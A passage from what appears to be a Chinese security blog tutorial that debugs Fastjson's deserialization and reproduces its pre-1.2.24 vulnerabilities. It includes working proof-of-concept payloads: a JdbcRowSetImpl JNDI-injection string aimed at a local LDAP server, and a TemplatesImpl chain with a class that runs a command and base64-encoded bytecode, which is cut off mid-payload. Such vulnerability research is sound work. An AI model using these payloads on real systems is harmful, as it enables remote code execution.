的开关判断中有这样一个判断，这里要有一个 getOnly 的方法，这里其实在前面方法遍历 add 的过程中也是有的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009143800744.png" alt="image-20231009143800744"></p><p>这里可以看到，要满足参数值不为一的一个方法，所以这里肯定不能是 set 方法，所以就只能是 get 方法，这里改一下 Test 类</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">private</span> <span class="token class-name">Map</span> map<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//        必须有无参的构造方法，以便 JSON 库能够实例化对象</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">return</span> age<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">Map</span> <span class="token function">getMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">return</span> map<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"Test&#123;"</span> <span class="token operator">+</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span></pre></td></tr><tr><td data-num="40"></td><td><pre>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里重新调试</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009150516227.png" alt="image-20231009150516227"></p><p>一直到这里之前的调试实际上都是一样的，这里就不在赘述，当前是第二次循环遍历所有的方法，可以看到当前是 getMap</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009161106016.png" alt="image-20231009161106016"></p><p>这里走到这个 add 方法中，我们跟进 FieldInfo 看一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009161214584.png" alt="image-20231009161214584"></p><p>前面这些一些赋值，判断就不是很重要</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009161708592.png" alt="image-20231009161708592"></p><p>一直到这里，可以看到，定义了一个 getOnly 的字段后，然后就开始判断</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009161826652.png" alt="image-20231009161826652"></p><p>这里因为当前的方法是 getMap，没有参数，所以能进 else，然后回将 getOnly 赋值为 ture</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009162348633.png" alt="image-20231009162348633"></p><p>这里前面的循环结束就直接出来</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009162425079.png" alt="image-20231009162425079"></p><p>跳出到刚刚获取类信息的地方</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009162529097.png" alt="image-20231009162529097"></p><p>当遍历 fields 到 map 的时候，在上面我们已经知道，getMap 是有 getOnly 的，所以这里就会将 asmEnable 设置为 false</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009162700192.png" alt="image-20231009162700192"></p><p>因此，在这里选择的就是内置的反序列化器，就可以正常调试了</p><h3 id="调整后的调试"><a class="anchor" href="#调整后的调试">#</a> 调整后的调试</h3><p>经过前面漫长的调整后，到这里才算是能够正常调试整个过程了，这里来看一下到底是怎么调用的 set 和 get</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009163701806.png" alt="image-20231009163701806"></p><p>书接上回，这里使用一个内置的 JavaBeanDeserializer</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009163800857.png" alt="image-20231009163800857"></p><p>然后就跳出了这个创建反序列化器的方法（可算出来了）</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009163915902.png" alt="image-20231009163915902"></p><p>跳出获取反序列化器的方法，接下来通过这个反序列化器反序列化</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009164029984.png" alt="image-20231009164029984"></p><p>这里调用 JavaBeanDeserializer 的 deserialze 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009164105482.png" alt="image-20231009164105482"></p><p>实际上是调用了一个 JavaBeanDeserializer 保护方法 deserialze 方法，又是一个很长很长的代码块，前面都是对各种特殊情况的检查</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009165521474.png" alt="image-20231009165521474"></p><p>这个 for 循环实际上是遍历所有 JSON 字段并将其映射到 Java 对象上</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009170843791.png" alt="image-20231009170843791"></p><p>看到这里，前面经过一系列判断，这里我们并不需要关注，这里有一个 createInstance 创建一个实例，我们跟进看一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009171013786.png" alt="image-20231009171013786"></p><p>这里会判断类如果是接口就会创建一个动态代理，如果不是接口就会尝试 newInstance</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009171201002.png" alt="image-20231009171201002"></p><p>这里看到就会执行这个构造函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009181232448.png" alt="image-20231009181232448"></p><p>这里跳出来后，接下来就是赋值，这里跟进 setValue 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009171531896.png" alt="image-20231009171531896"></p><p>然后就又是各种 if 判断，这里都不用关注</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009171623203.png" alt="image-20231009171623203"></p><p>这里可以看到，age 原本的值是 0，然后要赋的值是 18</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009171707963.png" alt="image-20231009171707963"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009171720593.png" alt="image-20231009171720593"></p><p>invoke 后就成功调用了 setAge 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010121006054.png" alt="image-20231010121006054"></p><p>这里中间的过程就不在这里记录了，这里是又一次调用了 setValue 方法来设置 name 的值</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010121115221.png" alt="image-20231010121115221"></p><p>这里就调用了 setName 方法，到目前为止，所有的 set 方法就都被触触发了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010134035107.png" alt="image-20231010134035107"></p><p>这里跳回到 parseObject 方法中，前面将 JSON 转为对象，最后有调用了一个 toJSON 将对象转为 JSON，get 方法就是这这里被调用的，这里跟进一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010134452164.png" alt="image-20231010134452164"></p><p>这里还是一些判断，我们往下看</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010142302041.png" alt="image-20231010142302041"></p><p>这里要获取字段值映射我们跟进这个方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010142437082.png" alt="image-20231010142437082"></p><p>然后这里要获取属性值，跟进这个 getPropertyValue 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010142627743.png" alt="image-20231010142627743"></p><p>就在这个 get 方法里进行了 invoke</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010142745028.png" alt="image-20231010142745028"></p><p>到这样算是真正的调试完了，其实漏洞的根源到这里就很明显了，它会自动调用构造方法，set，get 方法</p><h3 id="demo"><a class="anchor" href="#demo">#</a> demo</h3><p>这里简单写一个演示</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">private</span> <span class="token class-name">String</span> cmd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>上面写了一个恶意的 set</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastjsonTest</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"Fastjson.demo\",\"cmd\":\"calc\"&#125;&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010144650658.png" alt="image-20231010144650658"></p><h2 id="fastjson1246版本复现"><a class="anchor" href="#fastjson1246版本复现">#</a> fastjson&lt;=1.2.46 版本复现</h2><h3 id="fastjson1224"><a class="anchor" href="#fastjson1224">#</a> Fastjson&lt;=1.2.24</h3><h4 id="jdbcrowsetimpl"><a class="anchor" href="#jdbcrowsetimpl">#</a> JdbcRowSetImpl</h4><p>在这个类中有这样一个点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010161345781.png" alt="image-20231010161345781"></p><p>如果这里的 getDataSourceName () 可控的话，那么这里将是一个很标准的 JNDI 注入</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010161537110.png" alt="image-20231010161537110"></p><p>这里有对应的 get，set 方法，所以这里参数是可控的，利用点就是这里了，接下来找 connet 的调用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010164628369.png" alt="image-20231010164628369"></p><p>这里也只有三个，这里选用 set 这个方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010164714788.png" alt="image-20231010164714788"></p><p>这里经过一个判断就直接调用了这个方法，看下面这个例子</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc24JdbcRowSectimpl <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:1234/T\",\"AutoCommit\":false&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里的 ldap 是前面 JNDI 注入篇中使用到的<a href="https://blog.xcu.icu/2023/09/23/java%E5%AE%89%E5%85%A8/JNDI%E6%B3%A8%E5%85%A5/"> JNDI 注入 - java 安全 | Clown の Blog = (xcu.icu)</a></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010175221457.png" alt="image-20231010175221457"></p><p>也或者可以使用 yakit</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231010180017827.png" alt="image-20231010180017827"></p><h5 id="调试"><a class="anchor" href="#调试">#</a> 调试</h5><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012143753742.png" alt="image-20231012143753742"></p><p>这里就不在从前面 get，set 的调用调试了（上面已经写的很详细的了），直接看后面有关 JdbcRowSetlmapl 的调用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012135151807.png" alt="image-20231012135151807"></p><p>这里将断点下在 setAutoCommit 这里</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012135355555.png" alt="image-20231012135355555"></p><p>然后这里就会调用这个 connect 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012140139633.png" alt="image-20231012140139633"></p><p>在这个方法中就会走到 JNDI 注入的地方</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012140308677.png" alt="image-20231012140308677"></p><p>这里展示一下完整的调用链</p><h4 id="templatesimpl"><a class="anchor" href="#templatesimpl">#</a> TemplatesImpl</h4><p>上面的利用很显然是需要出网的情况，这里介绍一种不需要出网的利用方式，这里也不在写一堆废话来引出这个入口，实际上就是在 com.sun.org.apache.xalan.internal.xsltc.trax 类中的 getTransletInstance 方法中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011181254063.png" alt="image-20231011181254063"></p><p>这里有一个 newInstance 方法可以实实例化对象，这里看一下 _class [_transletIndex] 是不是可控的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011181948972.png" alt="image-20231011181948972"></p><p>这里可以看到其实在当前类的 defineTransletClasses 方法中，这里可以看到，这里的_transletIndex 是可以根据_bytecodes 改变的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011182146842.png" alt="image-20231011182146842"></p><p>而在本类下，还有对应的 set 和 get 方法，很显然是可控的，这里我们就需要看一下 defineTransletClasses 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011182426758.png" alt="image-20231011182426758"></p><p>首先这里会判断_bytecodes 是否为空，这里可控，所以这里我们可以传入一个恶意的类</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011182529594.png" alt="image-20231011182529594"></p><p>_bytecodes 不为空，运行到这里，此时，需要满足_tfactory 变量不为 null，否则导致程序异常退出。</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011182735816.png" alt="image-20231011182735816"></p><p>这个成员属性没有对应的 set 和 get 方法，这里需要指定 Feature.SupportNonPublicField 参数来为_tfactory 赋值</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011182940756.png" alt="image-20231011182940756"></p><p>把_bytecodes 数组中的值循环取出，使用 loader.defineClass 方法从字节码转化为 Class 对象，随后后赋值给_class [i]，如果循环到 main class，就会将_transletIndex 变量值赋值为_bytecodes 数组中的下标值</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011183255470.png" alt="image-20231011183255470"></p><p>在回到这个入口类，当前想要执行到 newInstance 方法，只需要_name 不为 null 即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011183402004.png" alt="image-20231011183402004"></p><p>它有对应的 set 方法，到这里条件就都满足了，然后望上找谁调用了 getTransletInstance 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011190203162.png" alt="image-20231011190203162"></p><p>这里实际上就找到一个 newTransformer 中调用了这方法，继续望上找谁调用了这个方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231011190251446.png" alt="image-20231011190251446"></p><p>这里找到，还是在本类中的 getOutputProperties () 方法中调用了 newTransformer () 方法，getOutputProperties () 方法为_outputProperties 成员变量的 getter 方法，调用条件到这里就完全满足了</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">T</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">static</span>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        </pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>就一个这样的类，将其编译后将字节码读出并用 base64 加密，作为_bytecodes</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc24TemplatesImpl <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANMVDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAZULmphdmEMAAoACwcAMAwAMQAyAQAEY2FsYwwAMwA0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADUBAAFUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUx